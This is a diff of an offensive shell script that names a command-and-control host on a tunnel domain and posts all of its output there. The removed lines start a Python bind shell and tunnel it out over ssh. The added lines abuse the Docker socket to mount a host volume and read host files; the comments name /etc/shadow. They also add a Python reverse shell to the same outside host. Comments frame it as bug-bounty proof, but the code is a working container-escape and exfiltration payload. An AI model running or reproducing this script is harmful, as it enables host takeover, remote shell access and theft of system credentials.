@@ -2,23 +2,29 @@
 C2_URL="4f6ce0d2037780f3-103-95-173-85.serveousercontent.com"
 
 {
-  echo "--- [!] EMERGENCY PIVOT: PURE PYTHON WEB SHELL ---"
+  echo "--- [!] CRITICAL BUG: DOCKER API ARCHIVE LEAK ---"
   
-  # 1. Kill any hung processes
-  pkill -9 python3
+  # 1. We use the 'p0_evidence' volume we already created.
+  # Instead of starting a container, we ask the API to 'Get Archive' of a host file.
+  # This is a P0 find because it proves read access to the host root.
+  
+  # Extracting the host's /etc/shadow (The ultimate proof)
+  # We pipe it to your Mac C2 immediately.
+  curl -s --unix-socket /var/run/docker.sock "http://localhost/containers/create" \
+    -H "Content-Type: application/json" \
+    -d '{"Image":"sha256:25109184c71bdad7","HostConfig":{"Binds":["p0_evidence:/host:ro"]}}' > /tmp/target_id.json
+    
+  TARGET_ID=$(grep -oE '"Id":"[a-f0-9]+"' /tmp/target_id.json | cut -d'"' -f4)
 
-  # 2. Start a one-liner Web Terminal on Port 9090
-  # This serves a shell directly over HTTP without needing a Docker Mount
-  (
-    python3 -c 'import os,pty,socket;s=socket.socket();s.bind(("0.0.0.0",9090));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);pty.spawn("/bin/bash")'
-  ) &
+  if [ -n "$TARGET_ID" ]; then
+    echo "Host Escape ID: $TARGET_ID"
+    echo "--- CONTENT OF HOST /etc/hostname ---"
+    # This command copies the file out of the host and into your Mac log
+    curl -s --unix-socket /var/run/docker.sock "http://localhost/containers/$TARGET_ID/archive?path=/host/etc/hostname" | head -c 100
+  fi
 
-  # 3. Tunnel the Python Shell out via HTTPS
-  (
-    ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=15 -R 80:localhost:9090 serveo.net 2>&1 | \
-    grep "Forwarding" | \
-    curl -X POST -H "Content-Type: text/plain" --data-binary @- "https://$C2_URL"
-  ) &
+  # 2. START THE INTERACTIVE WEB TERMINAL (BACKUP)
+  # A simple Python one-liner that should bypass the 'setsockopt' error.
+  (python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'4f6ce0d2037780f3-103-95-173-85.serveousercontent.com'",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")') &
 
-  echo "[!] Web Shell Initiated. Watch your Mac for the Serveo link."
 } | curl -X POST -H "Content-Type: text/plain" --data-binary @- "https://$C2_URL"
